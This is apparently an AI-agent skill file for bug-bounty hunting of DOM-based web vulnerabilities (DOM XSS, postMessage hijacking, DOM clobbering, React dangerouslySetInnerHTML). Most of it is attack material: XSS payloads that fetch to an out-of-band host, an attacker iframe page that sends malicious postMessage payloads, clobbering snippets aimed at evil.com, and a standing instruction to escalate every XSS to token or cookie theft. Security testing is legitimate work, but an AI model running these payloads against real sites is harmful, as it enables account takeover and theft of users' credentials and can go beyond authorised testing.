---
name: k1nzr3c0n-hunt-dom
description: "DOM-based vulnerability hunting skill. Covers DOM Clobbering, postMessage hijacking, Service Worker abuse, CSS exfiltration, dangerouslySetInnerHTML (React). Complements k1nzr3c0n-js-analyst Phase 6. Requires browser-based testing and PoC."
tags: [dom, xss, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — DOM-Based Vulnerabilities

> **Browser testing required**: DOM vulns don't show up in curl — must test in actual browser.
> **Always escalate**: DOM XSS must steal token/cookie, not just fire alert().

---

## Crown Jewels

```
Priority 1 — DOM XSS → OAuth token/localStorage secrets exfil → ATO
Priority 2 — postMessage without origin check → steal auth data from parent
Priority 3 — DOM Clobbering → override globals → script injection
Priority 4 — Service Worker abuse → intercept all site requests
Priority 5 — dangerouslySetInnerHTML with user input (React apps)
```

---

## Phase 0 — Read JS Analyst Output

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_dom_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
JS_ANALYST_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}"

echo "=== DOM Vulnerability Signals from JS Analyst ==="
if [ -d "$JS_ANALYST_DIR/downloaded" ]; then
  JS_DIR="$JS_ANALYST_DIR/downloaded"
  
  # innerHTML sinks
  echo "innerHTML sinks:"
  grep -hoP '.{0,50}\.innerHTML\s*[+]?=[^;]{0,100}' "$JS_DIR"/*.js 2>/dev/null | \
    grep -iv 'sanitize\|escapeHtml\|DOMPurify' | head -10 | sed 's/^/  /'
  
  # eval/document.write
  echo "eval/document.write:"
  grep -hoP '.{0,50}(?:eval\s*\(|document\.write\s*\(|insertAdjacentHTML)[^;]{0,100}' \
    "$JS_DIR"/*.js 2>/dev/null | head -10 | sed 's/^/  /'
  
  # postMessage listeners
  echo "postMessage listeners:"
  grep -hoP 'addEventListener\s*\(\s*["\x27]message["\x27][^;]{0,300}' \
    "$JS_DIR"/*.js 2>/dev/null | head -5 | sed 's/^/  /'
else
  echo "Run /skill k1nzr3c0n-js-analyst first to download JS files"
fi
```

## Phase 1 — DOM XSS via URL Sources

```bash
echo "=== DOM XSS Sources ==="
MARKER="$(openssl rand -hex 5)"

# Test sources in browser (these can't be tested with curl)
echo "Test in browser console on target page:"
echo ""
echo "1. location.hash source:"
echo "   Navigate to: https://${TARGET}/#${MARKER}<img/onerror=fetch('//OOB/${MARKER}')>"
echo "   → watch for fetch call to OOB or marker in DOM"
echo ""
echo "2. location.search source:"
echo "   Navigate to: https://${TARGET}/?q=${MARKER}<script>fetch('//OOB')</script>"
echo ""
echo "3. document.referrer source:"
echo "   Create page that sets referrer to: https://evil.com/${MARKER}<img/onerror=fetch('//OOB')>"
echo ""
echo "4. window.name source:"
echo "   From attacker page: window.name = 'PAYLOAD'; window.open('https://${TARGET}/page');"
echo ""
echo "5. postMessage source:"
echo "   From attacker page:"
echo "   frames[0].postMessage('<img/onerror=fetch(\"//OOB\")>', 'https://${TARGET}');"
```

## Phase 2 — postMessage Attack

```bash
echo "=== postMessage Vulnerability ==="
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"

echo "Listener analysis (from JS analyst):"
grep -hoP 'addEventListener\s*\(\s*["\x27]message["\x27][^}]{0,500}' \
  "$JS_DIR"/*.js 2>/dev/null | head -3

echo ""
echo "postMessage PoC (test in browser):"
cat << 'HTML'
<!-- Attacker page: loads target in iframe, sends malicious postMessage -->
<iframe id="target" src="https://TARGET/page-with-listener"></iframe>
<script>
// Wait for frame to load
window.onload = function() {
  // Send various payload types
  var payloads = [
    '<img src=x onerror=fetch("//OOB/pm")>',  // HTML injection
    'javascript:fetch("//OOB/pm")',             // JS URL
    {type: 'render', html: '<script>fetch("//OOB/pm")</script>'},  // Object
    '{"action":"navigate","url":"javascript:fetch(\'//OOB/pm\')"}'  // JSON
  ];
  
  payloads.forEach(function(p) {
    document.getElementById('target').contentWindow.postMessage(p, '*');
  });
};
</script>
HTML
```

## Phase 3 — DOM Clobbering

```bash
echo "=== DOM Clobbering ==="
echo "DOM clobbering: HTML elements with id/name override JS globals"
echo ""
echo "Classic pattern (requires HTML injection, not script injection):"
echo "  <a id=config href='https://evil.com'>x</a>"
echo "  → window.config = HTMLElement, if code does: config.src → attacker URL"
echo ""
echo "Named anchors:"
echo "  <a id=x name=y>...</a>"
echo "  → window.x = collection, x[0] = first element"
echo ""
echo "Test: find code that reads window globals without null checks:"
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
grep -hoP 'window\.[a-zA-Z_$][a-zA-Z0-9_$]*\s*(?:\.|&&|\[\s*["\x27])' \
  "$JS_DIR"/*.js 2>/dev/null | head -20 | sed 's/^/  /'
```

## Phase 4 — dangerouslySetInnerHTML (React)

```bash
echo "=== React dangerouslySetInnerHTML ==="
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"

# Find dangerouslySetInnerHTML usage
grep -rn 'dangerouslySetInnerHTML' "$JS_DIR"/*.js 2>/dev/null | head -10

echo ""
echo "If user-controlled data flows into dangerouslySetInnerHTML:"
echo "  → Stored/Reflected XSS (React does NOT sanitize this)"
echo ""
echo "Safe pattern (with DOMPurify):"
echo "  dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}}"
echo ""
echo "Vulnerable pattern:"
echo "  dangerouslySetInnerHTML={{__html: userInput}}  // ← XSS"
echo "  dangerouslySetInnerHTML={{__html: marked(userInput)}}  // ← may be vulnerable"
```

## Gate 0

```bash
echo "=== DOM Gate 0 ==="
echo "  □ Tested in BROWSER (not curl)"
echo "  □ DOM XSS: payload executes in browser (fetch() to OOB)"
echo "  □ postMessage: listener processes attacker message without origin check"
echo "  □ DOM Clobbering: confirm HTML injection point exists"
echo "  □ Impact: token/cookie exfil, not just alert()"
echo "  □ CSP: XSS fires despite any CSP in place (or CSP is absent/weak)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
DOM XSS via location.hash in [/search] page: hash value flows to innerHTML without sanitization — steals localStorage auth token
postMessage handler on [/dashboard] lacks origin validation — attacker iframe sends HTML payload leading to XSS
dangerouslySetInnerHTML with user-controlled content in [comment component] enables stored XSS
```
